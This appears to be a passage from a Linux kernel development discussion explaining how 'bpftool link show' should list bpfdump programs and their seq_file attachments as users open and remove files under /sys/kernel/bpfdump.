+The information returned for such link will be a pair (bpfdump_prog, bpfdump_seq_file).
+Meaning that at any given time 'bpftool link show' will show where every bpf
+prog in the system is attached to.
+Say named bpfdump_seq_file exists in /sys/kernel/bpfdump/tasks/foo.
+No one is doing a 'cat' on it yet.
+"bpftool link show" will show one link which is a pair (bpfdump_prog, "tasks/foo").
+Now two humans are doing 'cat' of that file.
+The bpfdump_prog refcnt is now 3 and there are two additional seq_files created
+by the kernel when user said open("/sys/kernel/bpfdump/tasks/foo").
+If these two humans are slow somebody could have done "rm /sys/kernel/bpfdump/tasks/foo"
+and that bpfdump_seq_file and it's member bpf_seq_file_link would be gone,
+but two other bpdump_seq_file-s are still active and they are different.
+"bpftool link show" should be showing two pairs (bpfdump_prog, seq_file_A) and
+(bpfdump_prog, seq_file_B).
+The users could have been in different pid namespaces. What seq_file_A is
+iterating could be completely different from seq_file_B, but I think it's
+useful for admin to know where all bpf progs in the system are attached and
+what kind of things are triggering them.
